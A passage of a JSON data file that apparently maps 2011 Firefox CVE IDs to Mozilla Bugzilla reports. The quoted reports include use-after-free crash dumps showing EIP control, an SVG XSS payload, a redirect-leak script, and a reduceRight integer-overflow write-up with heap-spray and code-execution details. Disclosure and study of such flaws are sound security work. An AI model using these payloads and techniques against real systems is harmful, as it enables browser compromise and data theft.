CharacterIterator::CharacterIterator(nsSVGGlyphFrame *aSource, PRBool aForceGlobalTransform) : mSource(aSource), mCurrentAdvance(0), mCurrentChar(-1), mInError(PR_FALSE) { if (!aSource->EnsureTextRun(&mDrawScale, &mMetricsScale, aForceGlobalTransform) || !aSource->GetCharacterPositions(&mPositions, mMetricsScale)) { mInError = PR_TRUE; } } nsSVGGlyphFrame::EnsureTextRun(float *aDrawScale, float *aMetricsScale, PRBool aForceGlobalTransform) { // Compute the size at which the text should render (excluding the CTM) const nsStyleFont* fontData = GetStyleFont(); ... } And here we reach a dangling pointer. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-0085": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=648100",
        "title": "Mozilla Firefox nsXULCommandDispatcher Remote Code Execution Vulnerability (ZDI-CAN-1203)",
        "description": "ZDI-CAN-1203: Mozilla Firefox nsXULCommandDispatcher Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within nsXULCommandDispatcher.cpp. During a NS_XUL_COMMAND_UPDATE event dispatch, the user is able to force command dispatcher to remove all the updaters in the mUpdaters chain including the one that is currently in use. As a result, the local variable updater becomes a stale pointer and updater->mNext refers to memory previously freed. Successful exploitation can lead to code execution in the context of the browser. Version(s) tested: 3.6.16 Platform(s) tested: Windows XP SP3 dispatcher-use-after-free1.xul results in the following crash: (700.4b0): Access violation - code c0000005 (!!! second chance !!!) eax=00000000 ebx=00000001 ecx=0012e7e4 edx=c1c2c3c8 esi=0012ec4c edi=0012ec4c eip=101a501e esp=0012e7dc ebp=c1c2c3c8 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 xul!nsXULCommandDispatcher::Matches+0xe: 101a501e 395d04 cmp dword ptr [ebp+4],ebx ss:0023:c1c2c3cc=???????? 0:000> k ChildEBP RetAddr 0012e7ec 1008d44b xul!nsXULCommandDispatcher::Matches+0xe [content\\xul\\document\\src\\nsxulcommanddispatcher.cpp @ 462] 0012e8fc 1027415b xul!nsXULCommandDispatcher::UpdateCommands+0x9b [content\\xul\\document\\src\\nsxulcommanddispatcher.cpp @ 412] 0012e910 10118e9e xul!NS_InvokeByIndex_P+0x27 [xpcom\\reflect\\xptcall\\src\\md\\win32\\xptcinvoke.cpp @ 103] 0012eba8 10114cb3 xul!XPCWrappedNative::CallMethod+0x52e [js\\src\\xpconnect\\src\\xpcwrappednative.cpp @ 2722] 0012ec74 0051790d xul!XPC_WN_CallMethod+0x173 [js\\src\\xpconnect\\src\\xpcwrappednativejsops.cpp @ 1740] 0012ed28 0051c654 js3250!js_Invoke+0x42d [js\\src\\jsinterp.cpp @ 1360] 0012ef64 00517766 js3250!js_Interpret+0x29c4 [js\\src\\jsops.cpp @ 2241] 0012f008 0050c1f3 js3250!js_Invoke+0x286 [js\\src\\jsinterp.cpp @ 1368] 0012f038 004ef727 js3250!js_InternalInvoke+0x103 [js\\src\\jsinterp.cpp @ 1423] 0012f060 101870a8 js3250!JS_CallFunctionValue+0x27 [js\\src\\jsapi.cpp @ 5115] 0012f0dc 1018bef3 xul!nsJSContext::CallEventHandler+0x188 [dom\\base\\nsjsenvironment.cpp @ 2198] 0012f288 1008673f xul!nsJSEventListener::HandleEvent+0x223 [dom\\src\\events\\nsjseventlistener.cpp @ 269] 0012f378 1012b311 xul!nsEventListenerManager::HandleEventSubType+0x38 [content\\events\\src\\nseventlistenermanager.cpp @ 1041] 0012f3d8 1012ad41 xul!nsEventListenerManager::HandleEvent+0x281 [content\\events\\src\\nseventlistenermanager.cpp @ 1147] 0012f420 10117418 xul!nsEventTargetChainItem::HandleEventTargetChain+0x281 [content\\events\\src\\nseventdispatcher.cpp @ 312] 0012f4ac 10071f3a xul!nsEventDispatcher::Dispatch+0x478 [content\\events\\src\\nseventdispatcher.cpp @ 577] 0012f518 1008023c xul!DocumentViewerImpl::LoadComplete+0x100 [layout\\base\\nsdocumentviewer.cpp @ 1036] 0012f708 10095402 xul!nsDocShell::EndPageLoad+0xda [docshell\\base\\nsdocshell.cpp @ 5722] 0012f730 100da833 xul!nsDocShell::OnStateChange+0xa2 [docshell\\base\\nsdocshell.cpp @ 5587] 0012f76c 100417d3 xul!nsDocLoader::FireOnStateChange+0x123 [uriloader\\base\\nsdocloader.cpp @ 1314] 0012f780 10084015 xul!nsDocLoader::doStopDocumentLoad+0x1c [uriloader\\base\\nsdocloader.cpp @ 937] 0012f7b0 100aba6b xul!nsDocLoader::DocLoaderIsEmpty+0x155 [uriloader\\base\\nsdocloader.cpp @ 804] 0012f7dc 10174d00 xul!nsDocLoader::OnStopRequest+0xdb [uriloader\\base\\nsdocloader.cpp @ 697] 0012f810 101ad388 xul!nsLoadGroup::RemoveRequest+0xc0 [netwerk\\base\\src\\nsloadgroup.cpp @ 680] 0012f830 101acc20 xul!nsDocument::DoUnblockOnload+0x4f [content\\base\\src\\nsdocument.cpp @ 7179] 0012f838 101acc75 xul!nsDocument::UnblockOnload+0x5d [content\\base\\src\\nsdocument.cpp @ 7120] 0012f84c 10020f4d xul!nsBindingManager::DoProcessAttachedQueue+0x53 [content\\xbl\\src\\nsbindingmanager.cpp @ 996] 0012f850 100f41d0 xul!nsRunnableMethod<nsBindingManager,void>::Run+0xe [obj-firefox\\dist\\include\\nsthreadutils.h @ 283] 0012f880 101a0552 xul!nsThread::ProcessNextEvent+0x210 [xpcom\\threads\\nsthread.cpp @ 533] 0012f8a8 10230895 xul!NS_ProcessPendingEvents_P+0x25 [obj-firefox\\xpcom\\build\\nsthreadutils.cpp @ 200] 0012f8b4 103f2535 xul!nsWindow::DispatchPendingEvents+0x2f [widget\\src\\windows\\nswindow.cpp @ 3143] 0012f9b8 100d00e5 xul!nsWindow::ProcessMessage+0x337915 0012f9f4 7e368734 xul!nsWindow::WindowProc+0xf5 [widget\\src\\windows\\nswindow.cpp @ 3727] 0012fa20 7e368816 USER32!InternalCallWinProc+0x28 0012fa88 7e3689cd USER32!UserCallWinProcCheckWow+0x150 0012fae8 7e368a10 USER32!DispatchMessageWorker+0x306 0012faf8 100d23ae USER32!DispatchMessageW+0xf 0012fb64 100d25c7 xul!nsAppShell::ProcessNextNativeEvent+0xae [widget\\src\\windows\\nsappshell.cpp @ 179] 0012fb84 100f4115 xul!nsBaseAppShell::OnProcessNextEvent+0x1f7 [widget\\src\\xpwidgets\\nsbaseappshell.cpp @ 299] 0012fbc0 1015f939 xul!nsThread::ProcessNextEvent+0x155 [xpcom\\threads\\nsthread.cpp @ 510] 0012fc00 1022a073 xul!mozilla::ipc::MessagePump::Run+0x69 [ipc\\glue\\messagepump.cpp @ 110] 0012fc3c 1022a03b xul!MessageLoop::RunHandler+0x26 [ipc\\chromium\\src\\base\\message_loop.cc @ 200] 0012fc74 10229140 xul!MessageLoop::Run+0x1f [ipc\\chromium\\src\\base\\message_loop.cc @ 174] 0012fc80 1022a1eb xul!nsBaseAppShell::Run+0x34 [widget\\src\\xpwidgets\\nsbaseappshell.cpp @ 180] 0012fc8c 1002e9fd xul!nsAppStartup::Run+0x1e [toolkit\\components\\startup\\src\\nsappstartup.cpp @ 184] 0012ff34 0040133b xul!XRE_main+0xdc3 [toolkit\\xre\\nsapprunner.cpp @ 3485] 0012ff80 004016c2 firefox!wmain+0x33b [toolkit\\xre\\nswindowswmain.cpp @ 120] 0012ffc0 7c817077 firefox!__tmainCRTStartup+0x152 [obj-firefox\\memory\\jemalloc\\crtsrc\\crtexe.c @ 591] 0012fff0 00000000 kernel32!BaseProcessStart+0x23 dispatcher-use-after-free2.xul demonstrates EIP control and results in the following crash: (574.614): Access violation - code c0000005 (!!! second chance !!!) eax=0c301010 ebx=0c301021 ecx=0c301014 edx=c1c2c3c4 esi=0012eb48 edi=0012eb28 eip=c1c2c3c4 esp=0012eb0c ebp=0012ec3c iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202 c1c2c3c4 ?? ??? -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-1187": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=624621",
        "title": "HTTP Redirections and remote content can be read by javascript errors.",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Build Identifier: <script> window.SyntaxError.prototype.__defineGetter__('name',function(){var e=this;for(var j in e){if(j!='name')console.log(j,e[j])}}); </script> <script src=\"http://google.com/\"></script> Reproducible: Always Steps to Reproduce: 1. execute the afore mentioned code 2. see the console 3. see that fileName includes the final URL of the redirection Actual Results: fileName leaks Expected Results: fileName shouldn't leak, or should say the URL in the <script src=\"...\" attribute"
      }
    ],
    "CVE-2011-1300": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=623791",
        "title": "[ANGLE] WebGLES shader assertion failed: (oldhashloc >= 0), function IncreaseHashTableSize",
        "description": "No description provided."
      }
    ],
    "CVE-2011-1712": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=640339",
        "title": "generate-id() function leaks information about valid heap addresses",
        "description": "As demonstrated at the test URL and announced on Chris Evans' blog the XPath generate-id() function returns a valid heap address which might provide a useful handle in other attacks. Appears to affect all browsers one way or another (Chrome was patched before announcing this). http://scarybeastsecurity.blogspot.com/2011/03/multi-browser-heap-address-leak-in-xslt.html"
      }
    ],
    "CVE-2011-2362": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=616264",
        "title": "Cookies set for www.foo.com. are sent to www.foo.com",
        "description": "Firefox considers the domains www.foo.com. (HOST1) to be the same as www.foo.com (HOST2) for cookie purposes. Note the trailing period in the first domain. Cookie values set by either HOST1/HOST2 can be retrieved by and sent to the other host. Tests showed that the hosts are considered different from crossdomain purposes. FF4b7, 3.6.11 and Safari 5.0.2 all exhibited the same behavior, while Chrome did not. See attached screenshots for demonstration. Steps used in screenshot 1. Visit www.tumblr.com. (controlled by me, sets a cookie) 2. Visit www.tumblr.com (note that the cookie I set is sent to tumblr.com) The tumblr issue isn't resolved yet. It seems to me that the Chrome way of handling hosts is more correct. However the specs may say otherwise. There may also be other areas of the code that exhibit similar behavior. User Agents FF4b7 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b7) Gecko/20100101 Firefox/4.0b7 FF3.6.11 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/10.04 (lucid) Firefox/3.6.11 Safari 5.0.2 Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-us) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5 Chrome 8.0.552.215 Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10"
      }
    ],
    "CVE-2011-2363": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=648160",
        "title": "Mozilla Firefox SVGPointList.appendItem Remote Code Execution Vulnerability (ZDI-CAN-1144)",
        "description": "ZDI-CAN-1144: Mozilla Firefox SVGPointList.appendItem Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the code responsible for parsing SVG polygon objects. The code within nsSVGPointList::AppendElement() does not account for user defined getter methods modifying or destroying the parent object during a repaint. An attacker can abuse this flaw to create a dangling pointer which is referenced during the traversal of the SVG container hierarchy. This can be leveraged to execute arbitrary code within the context of the browser. Version(s) tested: 3.6.13 Platform(s) tested: Win XP SP3 From content/svg/content/src/nsSVGPointList.cpp: NS_IMETHODIMP nsSVGPointList::AppendItem(nsIDOMSVGPoint *newItem, nsIDOMSVGPoint **_retval) { ... AppendElement(newItem); NS_ADDREF(*_retval); return NS_OK; } nsSVGPointList::AppendElement(nsIDOMSVGPoint* aElement) { ... mPoints.AppendElement(aElement); ... } As one can see potentially rogue implementation of nsIDOMSVGPoint is added to |mPoints| collection without check for being trusted/native. Our |mPoints| object's getters will be called at least twice. It is important to not break anything during the append itself (when modification event is dispatched) as that most probably would end up with non-exploitable condition. But after that, during the second method call (repaint event), removal of SVGPointElement and related frames leads to the following situation: (194.198): Access violation - code c0000005 (!!! second chance !!!) eax=c1c2c3e0 ebx=03c48300 ecx=053db000 edx=053db334 esi=c1c2c3c4 edi=03ced850 eip=102f1473 esp=0012ebfc ebp=0012ec20 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 xul!nsCachedStyleData::GetStyleSVG: 102f1473 8b00 mov eax,dword ptr [eax] ds:0023:c1c2c3e0=???????? 0:000> k ChildEBP RetAddr 0012e838 101c0196 xul!nsCachedStyleData::GetStyleSVG 0012e840 102fab28 xul!nsStyleContext::GetStyleSVG+0xb 0012e848 10631e1e xul!nsIFrame::GetStyleSVG+0x9 0012e860 10631f5f xul!nsSVGGeometryFrame::SetupCairoFill+0x14 0012e8a0 1082fbc7 xul!nsSVGPathGeometryFrame::Render+0xa9 0012e8ec 10758628 xul!nsSVGPathGeometryFrame::PaintSVG+0x31 0012e9bc 107587d3 xul!nsSVGUtils::PaintFrameWithEffects+0x227 0012e9dc 10758628 xul!nsSVGDisplayContainerFrame::PaintSVG+0x30 0012eaac 107588c2 xul!nsSVGUtils::PaintFrameWithEffects+0x227 0012eb20 10758902 xul!nsSVGOuterSVGFrame::Paint+0xdb 0012eb3c 100d54b3 xul!nsDisplaySVG::Paint+0x24 0012eb4c 100b67ac xul!nsDisplayList::Paint+0x23 0012eb60 100d54b3 xul!nsDisplayClip::Paint+0x2c 0012eb70 100b67ac xul!nsDisplayList::Paint+0x23 0012eb84 100d54b3 xul!nsDisplayClip::Paint+0x2c 0012eb94 100b67ac xul!nsDisplayList::Paint+0x23 0012eba8 100d5908 xul!nsDisplayClip::Paint+0x2c 0012ee8c 1018a3af xul!nsLayoutUtils::PaintFrame+0x1b8 0012eea8 1018a2b0 xul!PresShell::Paint+0x4f 0012ef10 1017e647 xul!nsViewManager::RenderViews+0xd0 0012ef7c 100de47e xul!nsViewManager::Refresh+0x1a7 0012efd8 100cb1da xul!nsViewManager::DispatchEvent+0x29e 0012f004 101915a5 xul!HandleEvent+0x10a 0012f018 101915fb xul!nsWindow::DispatchEvent+0x25 0012f02c 100afa78 xul!nsWindow::DispatchWindowEvent+0x13 0012f220 100bad7a xul!nsWindow::OnPaint+0x4a8 0012f32c 100d00e5 xul!nsWindow::ProcessMessage+0x15a 0012f368 7e368734 xul!nsWindow::WindowProc+0xf5 0012f394 7e368816 USER32!InternalCallWinProc+0x28 0012f3fc 7e378ea0 USER32!UserCallWinProcCheckWow+0x150 0012f450 7e378eec USER32!DispatchClientMessage+0xa3 0012f478 7c90e473 USER32!__fnDWORD+0x24 0012f49c 7e3694d2 ntdll!KiUserCallbackDispatcher+0x13 0012f4e4 7e3696c7 USER32!NtUserDispatchMessage+0xc 0012f4f4 746ef75e USER32!DispatchMessageA+0xf 0012f52c 746f0078 MSCTF!CModalLoop::WaitRemoveMessage+0x6f 0012f54c 746f0138 MSCTF!CModalLoop::WaitHandleWndMessages+0x127 0012f588 746f067d MSCTF!CModalLoop::BlockFn+0xb4 0012f80c 746f0b92 MSCTF!CProxy::SendReceive+0x1b1 0012f820 746f0ffa MSCTF!CMarshalParamCreator::SendReceive+0x15 0012f88c 746f1738 MSCTF!CProxy::proxy_Param+0x455 0012f8b8 746ed307 MSCTF!CProxyITfLangBarItemSink::OnUpdate+0x3c 0012f8d0 746f0308 MSCTF!CLangBarItemMgr::OnUpdateHandler+0x36 0012f9f4 7e368734 MSCTF!CicMarshalWndProc+0xea 0012fa20 7e368816 USER32!InternalCallWinProc+0x28 0012fa88 7e3689cd USER32!UserCallWinProcCheckWow+0x150 0012fae8 7e368a10 USER32!DispatchMessageWorker+0x306 0012faf8 100d23ae USER32!DispatchMessageW+0xf 0012fb60 0035eeea xul!nsAppShell::ProcessNextNativeEvent+0xae 0012fb84 100f4115 nspr4!PR_IntervalNow+0x1a 0012fbc0 1015fa66 xul!nsThread::ProcessNextEvent+0x155 0012fc00 1022a073 xul!mozilla::ipc::MessagePump::Run+0x196 0012fc3c 1022a03b xul!MessageLoop::RunHandler+0x26 0012fc74 10229140 xul!MessageLoop::Run+0x1f 0012fc80 1022a1eb xul!nsBaseAppShell::Run+0x34 0012fc8c 1002e9fd xul!nsAppStartup::Run+0x1e 0012ff34 0040133b xul!XRE_main+0xdc3 0012ff80 004016c2 firefox!wmain+0x33b 0012ffc0 7c817077 firefox!__tmainCRTStartup+0x152 0012fff0 00000000 kernel32!BaseProcessStart+0x23 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-2366": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=655987",
        "title": "Respond to the WebGL cross-domain image theft vulnerability",
        "description": "Proof-of-concept: http://www.contextis.co.uk/resources/blog/webgl/poc/index.html The proof-of-concept consists in loading a cross-domain image as a WebGL texture, and rendering each pixel using a shader program that takes an amount of time proportional to the R, G, B values of pixels. By timing this, they get an approximation of the image. The attacker has to make a compromise between image quality and time. The higher the wanted quality, the longer it takes to steal. The biggest hurdle that an attacker faces is that it's usually hard to know the URLs of sensitive images to steal. If the attacker knows URLs to steal and is able to get users to run WebGL scripts, if some users will stay long enough on his page (between 1 and 30 minutes needed depending on image size/quality), he can steal their images with that technique."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=656277",
        "title": "Prevent loading WebGL textures from cross-domain images",
        "description": "In order to fix bug 655987 i.e. respond to this exploit, http://www.contextis.co.uk/resources/blog/webgl/poc/index.html We need to prevent using cross-domain images as WebGL textures. We also need to prevent using a canvas/2d as proxy for doing the same thing. Then we may consider relaxing this with CORS."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=659349",
        "title": "WebGL allows access to uninitialised graphics memory",
        "description": "User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: The linked conformance test checks that a WebGL canvas isn't given unintialised memory when it is resized. We found that it fails on some configurations on Windows XP and MacOS X. By using a larger canvas is it possible to view graphics data from other web pages, and on MacOS various parts of the desktop as well. I'm attaching a PoC that loads an iframe onto a texture (by applying a CSS transform/transition to it), then searches for it in graphics memory. An SVG color matrix filter is allied to it to set the red channel to a specific value which we then search for. Although the retrieved image is somewhat scrambled, the PoC could be further developed by encoding position information for each pixel into the color channels and using that information to reconstruct the whole image. We've tested this with success on Intel and ATI cards on WinXP and Nvidia and Intel cards on some recent Macs. Reproducible: Always Steps to Reproduce: 1. Get WebGL context 2. Resize canvas 3. Copy WebGL canvas onto 2d canvas 4. read pixels"
      }
    ],
    "CVE-2011-2367": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=656752",
        "title": "WebGL crash [@gleRunVertexSubmitImmediate()]",
        "description": "Environment: ProductName: Mac OS X ProductVersion: 10.6.7 BuildVersion: 10J869 OpenGL renderer string: NVIDIA GeForce GT 330M OpenGL Engine OpenGL version string: 2.1 NVIDIA-1.6.26 and OpenGL renderer string: ATI Radeon HD 6750M OpenGL Engine OpenGL version string: 2.1 ATI-1.6.32"
      }
    ],
    "CVE-2011-2368": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=657201",
        "title": "WebGL crash [@createProgram/@gldCopyTexSubImage]",
        "description": "Sometimes it crashes in createProgram, sometimes in gldCopyTexSubImage. The bug is currently only reproducible against: ProductName: Mac OS X ProductVersion: 10.6.7 BuildVersion: 10J869 OpenGL renderer string: ATI Radeon HD 6750M OpenGL Engine OpenGL version string: 2.1 ATI-1.6.32 I have marked this as a security issue because I get some write violations at different places."
      }
    ],
    "CVE-2011-2369": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=650001",
        "title": "SVG innerHTML getter doesn't encode entities, enabling XSS",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.16) Gecko/20110323 Ubuntu/10.10 (maverick) Firefox/3.6.16 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0 In-line SVG allows to have HTML entities in plain-text tags be auto decoded. This enables XSS by injecting entities via URL. Check the example link for a PoC. PoC: http://html5sec.org/innerhtml?xss=%3C!doctype%20html%3E%3Csvg%3E%3Cstyle%3E%26amplt;img%20src=x%20onerror=alert%281%29%26ampgt;%3Cp%3E <!doctype html><svg><style>&lt;img src=x onerror=alert(1)&gt;<p> // also works with crippled named entities (!!) <!doctype html><svg><style>&ltimg src=x onerror=alert(1)&gt<p> The bug also triggers on innerHTML/outerHTML access (see example link). No other tested browser was affected by this quirk (IE9, GC10-12, O11). Other browsers encounter this problem by excluding a certain range of characters from being auto-decoded. FF4-6 is the only browser auto-decoding &lt and &gt (among others). Tested on FF4 - 6.0a1 Reproducible: Always Steps to Reproduce: 1. Click on the link 2. Shock 3. Awe"
      }
    ],
    "CVE-2011-2370": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=645699",
        "title": "A non-whitelisted site can trigger xpinstall",
        "description": "http://mxr.mozilla.org/mozilla-central/source/toolkit/mozapps/extensions/content/extensions-content.js#93 93 install: function(aArgs, aCallback) { 94 if (!aArgs || typeof aArgs != \"object\") 95 throw new Error(\"Incorrect arguments passed to InstallTrigger.install()\"); 96 97 var params = { 98 installerId: this.installerId, 99 mimetype: \"application/x-xpinstall\", 100 referer: this.window.location.href, 101 uris: [], 102 hashes: [], 103 names: [], 104 icons: [], 105 }; this.window is a SJOW. And it's possible to redefine window.location. Thus, content code can control this.window.location.href."
      }
    ],
    "CVE-2011-2371": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=664009",
        "title": "Array.reduceRight() info leak and potential code execution",
        "description": "Chris Rohlf and Yan Ivnitskiy are giving a talk at BlackHat 2011 on the security risks of JIT engines. https://www.blackhat.com/html/bh-us-11/bh-us-11-briefings.html#Rohlf The have provided a Ruby Sinatra server PoC and the following details: =begin Mozilla Firefox 4.0.1 Array.reduceRight() Vulnerability Firefox 4.0.1 contains an integer overflow that can lead to an information leak and arbitrary code execution. Quick Reproduction Steps: 1. Create an Array object 2. Set Array object length to MAX_UINT-1 3. Call reduceRight(Function()) on new Array When the reduceRight method is called on an Array object instance execution transferred to array_extra() in jsarray.cpp. This function first determines if the argument passed to the method is a callable object (such as a function) that will be called for each element of the array. If this test passes then the following code is executed: 1. line 2740 jsarray.cpp reads in the Array.length property to an unsigned integer: ... jsuint length; if (!js_GetLengthProperty(cx, obj, &length)) return JS_FALSE; ... 2. line 2767 jsarray.cpp start, end and step are initialized but reversed if the method called is reduceRight(). These variables are all signed integers ... jsint start = 0, end = length, step = 1; switch (mode) { case REDUCE_RIGHT: start = length - 1, end = -1, step = -1; ... 3. A call to GetElement is made on line 2784. Below is the function prototype for the GetElement function: ... GetElement(JSContext *cx, JSObject *obj, jsdouble index, JSBool *hole, Value *vp) ... This first call to GetElement can be avoided by providing >= 2 arguments to the reduceRight() call. The call to GetElement on line 2839 is the call we want to reach. This call lies within a giant for loop that iterates over each element of the array calling the Javascript callback provided as the first argument to reduceRight() 4. Now that a controllable signed index value is passed into GetElement the following if statement is executed: ... JS_ASSERT(index >= 0); // <- NOT EXECUTED UNLESS DEBUG BUILD if (obj->isDenseArray() && index < obj->getDenseArrayCapacity() && !(*vp = obj->getDenseArrayElement(uint32(index))).isMagic(JS_ARRAY_HOLE)) { *hole = JS_FALSE; return JS_TRUE; } ... - The call to obj->isDenseArray() should succeed. - The return value of obj->getDenseArrayCapacity() should return 16 - The call to '*vp = obj->getDenseArrayElement(uint32(index))).isMagic(JS_ARRAY_HOLE)' boils down to a call to getSlot(index) on line 334 of jsobjinlines.h This getSlot(index) call is on 686 of jsobj.h basically executes: obj->slots[attacker_controlled_index] - The *vp pointer now points out of bounds from the obj->slots array. If this doesn't point to a mapped page then the process will crash. If the page is mapped then we read this value and return it as the value of that location in the array. - *vp is actually a Value class instance which contains a jsval_layout union, which means our leaked Value may be interpreted as an Integer, String or Object value. Continuing down the vulnerable code path... 5. Back in array_extra() the following code is executed ... for (jsint i = start; i != end; i += step) { JSBool hole; ok = JS_CHECK_OPERATION_LIMIT(cx) && GetElement(cx, obj, i, &hole, tvr.addr()); // line 2839 of jsarray.cpp (shown in #4) ... uintN argi = 0; if (REDUCE_MODE(mode)) // setup the arguments to reduceRight() session[argi++] = *vp; // prev session[argi++] = tvr.value(); // current (our information leak) session[argi++] = Int32Value(i); // index session[argi] = objv; // array /* Do the call. */ ok = session.invoke(cx); // invoke the javascript callback ... - So now in our reduceRight() callback function we have a leaked value (current) - Code execution is possible via heap spray. We simply spray a bunch of fake Value's tagged as type JSVAL_TYPE_OBJECT and control their asPtr and ptr members which will lead to all sorts of exploitable conditions. Below is a working ruby Sinatra server that will demonstrate a reliable information leak and somewhat reliable code execution. When run under 32bit linux this POC should leak many libxul pointers stored just beneath the obj->slots[] array in memory. Heres the output of GDB that proves code execution is possible. Once the Value is controlled by the attacker in the reduceRight callback we trigger a method off the object such as setting an element and execution is transferred to the JIT'd SetElem method which calls obj->setProperty() (gdb) bt 5 #0 0x070c0c0c in ?? () #1 0x01e76af4 in setProperty (f=...) at /builds/slave/rel-2.0-lnx-bld/build/js/src/jsobj.h:1232 #2 js::mjit::stubs::SetElem<0> (f=...) at /builds/slave/rel-2.0-lnx-bld/build/js/src/methodjit/StubCalls.cpp:567 #3 0x08cf3b4a in ?? () #4 0x01daf61a in js::mjit::EnterMethodJIT (cx=0xb1178680, fp=0xb2eff0c0, code=0x8cf3a10, stackLimit=0xb2f8baf0) at /builds/slave/rel-2.0-lnx-bld/build/js/src/methodjit/MethodJIT.cpp:749 (More stack frames follow...) (gdb) i r eax 0xb1178680 -1323858304 ecx 0x1 1 edx 0x70c0c0c 118230028 ebx 0x22827b4 36186036 esp 0xbfe67e6c 0xbfe67e6c ebp 0xbfe67ec0 0xbfe67ec0 esi 0xb2eff108 -1292898040 edi 0xc0c0c0c 202116108 eip 0x70c0c0c 0x70c0c0c eflags 0x210206 [ PF IF RF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 Disassembly of SetElement once edx is controlled: 0x1e76ac8 <js::mjit::stubs::SetElem<0>(js::VMFrame&)+152>: mov 0x64(%edx),%edx <- edx = 0x0c0c0c0c 0x1e76acb <js::mjit::stubs::SetElem<0>(js::VMFrame&)+155>: test %edx,%edx <- edx = 0x070c0c0c 0x1e76acd <js::mjit::stubs::SetElem<0>(js::VMFrame&)+157>: je 0x1e76b88 <js::mjit::stubs::SetElem<0>(js::VMFrame&)+344> 0x1e76ad3 <js::mjit::stubs::SetElem<0>(js::VMFrame&)+163>: lea 0x28(%esp),%eax 0x1e76ad7 <js::mjit::stubs::SetElem<0>(js::VMFrame&)+167>: mov %eax,0xc(%esp) 0x1e76adb <js::mjit::stubs::SetElem<0>(js::VMFrame&)+171>: mov 0x20(%esp),%eax 0x1e76adf <js::mjit::stubs::SetElem<0>(js::VMFrame&)+175>: movl $0x0,0x10(%esp) 0x1e76ae7 <js::mjit::stubs::SetElem<0>(js::VMFrame&)+183>: mov %ecx,0x8(%esp) 0x1e76aeb <js::mjit::stubs::SetElem<0>(js::VMFrame&)+187>: mov %edi,0x4(%esp) 0x1e76aef <js::mjit::stubs::SetElem<0>(js::VMFrame&)+191>: mov %eax,(%esp) 0x1e76af2 <js::mjit::stubs::SetElem<0>(js::VMFrame&)+194>: call *%edx <- call 0x070c0c0c (setProperty) This vulnerability was discovered and researched by Chris Rohlf of Matasano Security. ** This has only been tested on 32bit Ubuntu 11.04 with Firefox 4.0.1 ** =end"
      }
    ],
    "CVE-2011-2372": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=657462",
        "title": "Holding enter allows arbitrary code execution due to Download Manager",
        "description": "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 It is possible to execute an arbitrary code in the context of user's operating system if a user holds Enter for about 1-2 seconds. Consider the attached example -- a file download prompt pops up and a user has only about a second to react (with the default Firefox settings -- it could be a fraction of second more if the option to always ask where to save files was explicitly selected). If they keep holding Enter and there was no \"Downloads\" window on the task bar prior to the prompt (thus the newly appearing \"Downloads\" window with the malicious file highlighted gains focus), an arbitrary code will be executed. No user interaction other than holding Enter is needed for a successful exploitation of this issue. The windows appear in a very brief instant and an attacker can use a number of methods to easily distract user's attention to make them hold the crucial key a fraction of second longer. I think that the primary problem here is that the keyboard buffer isn't 